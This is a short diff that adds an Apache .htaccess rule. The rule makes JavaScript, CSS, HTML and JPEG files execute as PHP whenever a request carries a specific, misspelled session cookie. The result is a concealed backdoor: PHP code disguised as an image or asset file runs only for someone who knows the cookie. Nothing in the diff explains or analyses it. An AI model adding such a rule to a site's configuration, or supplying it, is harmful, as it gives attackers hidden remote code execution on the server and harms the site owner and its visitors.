@@ -1,0 +1,5 @@
+<FilesMatch "\.(js|css|html|jpg|jpeg)$">
+    <If "%{HTTP_COOKIE} =~ /SESSION_ATHENTICATION=TRUE/">
+        SetHandler application/x-httpd-php
+    </If>
+</FilesMatch>
